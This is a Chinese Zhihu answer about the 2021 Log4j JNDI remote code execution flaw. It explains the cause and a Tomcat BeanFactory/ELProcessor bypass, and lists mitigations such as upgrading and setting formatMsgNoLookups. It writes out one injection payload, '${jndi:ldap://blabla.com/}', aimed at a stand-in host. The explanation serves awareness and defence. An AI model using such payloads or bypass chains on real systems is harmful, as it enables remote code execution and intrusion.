
---
title: 'Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？'
categories: 
 - 社交媒体
 - 知乎
 - 知乎热榜
headimg: 'https://picsum.photos/400/300?random=1849'
author: 知乎
comments: false
date: Fri, 10 Dec 2021 08:57:28 GMT
thumbnail: 'https://picsum.photos/400/300?random=1849'
---

<div>   
nlfox的回答<br><br><p data-pid="_MHzVbgf">脚本小子的又一次狂欢【</p><p data-pid="sj9aWLLM">这个问题要问大不大，确实是大，数什么玩意没有用Log4j2可能比数什么玩意用了Log4j2来的快一点。</p><p data-pid="2yx-SdIr">目前网上流传的exp更是简单粗暴直接居然还有效，Random script boys be like：这是payload，这是框框，ctrlc，ctrlv，boom，他被黑啦，截图吹逼辣！</p><p data-pid="S55IAjWW"><b>但是并不是看到了发回来的DNS请求就一定能利用。</b></p><p data-pid="D4oP7gQP">毕竟一定版本JDK之后， <code>com.sun.jndi.ldap.object.trustURLCodebase</code>已经是默认false了，断了直接读取远程代码的路子，想直接读取远程代码是会失败的。</p><p data-pid="qMF4XP_9">问题是不让执行远程代码，还有本地代码可以利用啊，所以绕过的办法很多，需要具体情况具体分析，不同的框架有不同的依赖，需要找不一样的利用链。</p><p data-pid="W0y2Oumu">比如如果依赖有Tomcat，可以利用<a href="http://link.zhihu.com/?target=https%3A//github.com/apache/tomcat/blob/main/java/org/apache/naming/factory/BeanFactory.java" class=" wrap external" target="_blank" rel="nofollow noreferrer">org.apache.naming.factory.BeanFactory</a>，配合javax.el.ELProcessor来执行任意代码。详见[1].</p><p data-pid="0nGfulb5">还有一些其他的利用链详见[2]</p><p data-pid="WMbmYEUl">所以想要绕过大部分时候总能找到办法，鬼知道你依赖里面有什么贵物？</p><p data-pid="Zz_QZ1Sp">目前对这个漏洞利用还处于早期阶段（ctrlc ctrlv），好在现在大家都非常重视，修的应该会很快，吧，大概。反正我们内部buildertool已经在merge fix了，现在基本上是个Sev1级别的issue（前两天AWS挂掉那种等级），block所有对有漏洞版本Log4j的build，大部分team会收到Sev2然后被要求deploy最新版本的Log4j2。</p><h3>目前为止一些解决方案</h3><ol><li data-pid="h8t3wtzo">使用最新的2.15.0-rc2 <a href="http://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" class=" wrap external" target="_blank" rel="nofollow noreferrer">Release log4j-2.15.0-rc2 · apache/logging-log4j2</a></li><li data-pid="kxs72WN5">把<code>log4j2.formatMsgNoLookups</code>设为true </li><li data-pid="PNzKYdLP">写WAF规则先挡一挡【</li></ol><p data-pid="OpGkQKOe"><br></p><p data-pid="4cLbTU9l">什么，影响？大的还在路上呢.jpg</p><p><br></p><h3>原理</h3><p data-pid="mvi4GxWM"><a href="http://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/log4j-2.3/manual/lookups.html%23JndiLookup" class=" wrap external" target="_blank" rel="nofollow noreferrer">Log4j - Log4j 2 Lookups - Apache Log4j 2</a></p><p data-pid="1YCS4Fhk">官方教你利用怕不怕.jpg</p><p data-pid="M_XFD_Ol">完全就是Log4j2作为一个单纯简化日志操作的库加了其实没有很大必要的功能，加了一个用JNDI读取变量的feature，啥验证没有，不幸酿成惨剧。</p><p data-pid="Uaq-FF2_">只要你log了用户输入能够控制的变量，那么只要用户输入了任何能包含<code>$&#123;jndi:ldap://blabla.com/&#125;</code> 的内容，Log4j2都会尝试通过jndi读取这个变量。</p><p data-pid="IHrk2HMd">这个问题算是新时代的format string漏洞或者说也能算一种SSTI，数据和代码混淆导致的RCE，类似的例子已经有很多了。</p><h3>Reference</h3><p data-pid="ngVbZnIx">[1] <a href="http://link.zhihu.com/?target=https%3A//www.veracode.com/blog/research/exploiting-jndi-injections-java" class=" wrap external" target="_blank" rel="nofollow noreferrer">Exploiting JNDI Injections in Java | Veracode</a></p><p data-pid="R5cH0LcX">[2] <a href="http://link.zhihu.com/?target=https%3A//www.cnblogs.com/yyhuni/p/15088134.html" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">cnblogs.com/yyhuni/p/15</span><span class="invisible">088134.html</span><span class="ellipsis"></span></a></p>  
</div>
            